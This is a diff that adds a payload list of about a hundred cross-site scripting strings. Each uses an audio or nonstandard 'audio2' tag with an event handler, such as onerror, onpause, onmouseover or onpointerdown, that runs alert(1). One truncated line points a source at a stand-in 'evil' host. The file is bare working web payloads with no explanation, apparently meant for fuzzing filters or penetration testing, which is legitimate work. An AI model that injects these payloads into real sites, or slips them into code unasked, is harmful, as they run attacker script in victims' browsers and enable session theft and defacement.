@@ -1,0 +1,98 @@
+<audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
+<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
+<audio controls src=1 onfocus=alert(1) autofocus>
+<audio controls src=1 onfocusin=alert(1) autofocus>
+<audio draggable="true" ondrag="alert(1)">test</audio>
+<audio draggable="true" ondragend="alert(1)">test</audio>
+<audio draggable="true" ondragenter="alert(1)">test</audio>
+<audio draggable="true" ondragleave="alert(1)">test</audio>
+<audio draggable="true" ondragstart="alert(1)">test</audio>
+<audio id=x controls onfocus=alert(1) id=x><source src="validaudio.wav"></audio>
+<audio id=x controls onfocusin=alert(1) id=x><source src="validaudio.wav"></audio>
+<audio id=x tabindex=1 onactivate=alert(1)></audio>
+<audio id=x tabindex=1 onbeforeactivate=alert(1)></audio>
+<audio id=x tabindex=1 onbeforedeactivate=alert(1)></audio><input autofocus>
+<audio id=x tabindex=1 ondeactivate=alert(1)></audio><input id=y autofocus>
+<audio onafterscriptexecute=alert(1)><script>1</script>
+<audio onbeforecopy="alert(1)" contenteditable>test</audio>
+<audio onbeforecut="alert(1)" contenteditable>test</audio>
+<audio onbeforepaste="alert(1)" contenteditable>test</audio>
+<audio onbeforescriptexecute=alert(1)><script>1</script>
+<audio onblur=alert(1) tabindex=1 id=x></audio><input autofocus>
+<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio onclick="alert(1)">test</audio>
+<audio oncontextmenu="alert(1)">test</audio>
+<audio oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<audio oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<audio ondblclick="alert(1)" autofocus tabindex=1>test</audio>
+<audio onfocusout=alert(1) tabindex=1 id=x></audio><input autofocus>
+<audio onkeydown="alert(1)" contenteditable>test</audio>
+<audio onkeypress="alert(1)" contenteditable>test</audio>
+<audio onkeyup="alert(1)" contenteditable>test</audio>
+<audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio onmousedown="alert(1)">test</audio>
+<audio onmouseenter="alert(1)">test</audio>
+<audio onmouseleave="alert(1)">test</audio>
+<audio onmousemove="alert(1)">test</audio>
+<audio onmouseout="alert(1)">test</audio>
+<audio onmouseover="alert(1)">test</audio>
+<audio onmouseup="alert(1)">test</audio>
+<audio onmousewheel=alert(1)>requires scrolling
+<audio onpaste="alert(1)" contenteditable>test</audio>
+<audio onpointerdown=alert(1)>XSS</audio>
+<audio onpointerenter=alert(1)>XSS</audio>
+<audio onpointerleave=alert(1)>XSS</audio>
+<audio onpointermove=alert(1)>XSS</audio>
+<audio onpointerout=alert(1)>XSS</audio>
+<audio onpointerover=alert(1)>XSS</audio>
+<audio onpointerrawupdate=alert(1)>XSS</audio>
+<audio onpointerup=alert(1)>XSS</audio>
+<audio src/onerror=alert(1)>
+<audio src onloadstart=alert(1)>
+<audio><source src="//evil?
+<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+<audio onerror="javascript:alert(1)"><source>//INJECTX
+<audio2 draggable="true" ondrag="alert(1)">test</audio2>
+<audio2 draggable="true" ondragend="alert(1)">test</audio2>
+<audio2 draggable="true" ondragenter="alert(1)">test</audio2>
+<audio2 draggable="true" ondragleave="alert(1)">test</audio2>
+<audio2 draggable="true" ondragstart="alert(1)">test</audio2>
+<audio2 id=x tabindex=1 onactivate=alert(1)></audio2>
+<audio2 id=x tabindex=1 onbeforeactivate=alert(1)></audio2>
+<audio2 id=x tabindex=1 onbeforedeactivate=alert(1)></audio2><input autofocus>
+<audio2 id=x tabindex=1 ondeactivate=alert(1)></audio2><input id=y autofocus>
+<audio2 onafterscriptexecute=alert(1)><script>1</script>
+<audio2 onbeforescriptexecute=alert(1)><script>1</script>
+<audio2 onclick="alert(1)">test</audio2>
+<audio2 oncontextmenu="alert(1)">test</audio2>
+<audio2 oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<audio2 oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<audio2 ondblclick="alert(1)" autofocus tabindex=1>test</audio2>
+<audio2 onkeydown="alert(1)" contenteditable>test</audio2>
+<audio2 onkeypress="alert(1)" contenteditable>test</audio2>
+<audio2 onkeyup="alert(1)" contenteditable>test</audio2>
+<audio2 onmousedown="alert(1)">test</audio2>
+<audio2 onmouseenter="alert(1)">test</audio2>
+<audio2 onmouseleave="alert(1)">test</audio2>
+<audio2 onmousemove="alert(1)">test</audio2>
+<audio2 onmouseout="alert(1)">test</audio2>
+<audio2 onmouseover="alert(1)">test</audio2>
+<audio2 onmouseup="alert(1)">test</audio2>
+<audio2 onmousewheel=alert(1)>requires scrolling
+<audio2 onpointerdown=alert(1)>XSS</audio2>
+<audio2 onpointerenter=alert(1)>XSS</audio2>
+<audio2 onpointerleave=alert(1)>XSS</audio2>
+<audio2 onpointermove=alert(1)>XSS</audio2>
+<audio2 onpointerout=alert(1)>XSS</audio2>
+<audio2 onpointerover=alert(1)>XSS</audio2>
+<audio2 onpointerrawupdate=alert(1)>XSS</audio2>
+<audio2 onpointerup=alert(1)>XSS</audio2>
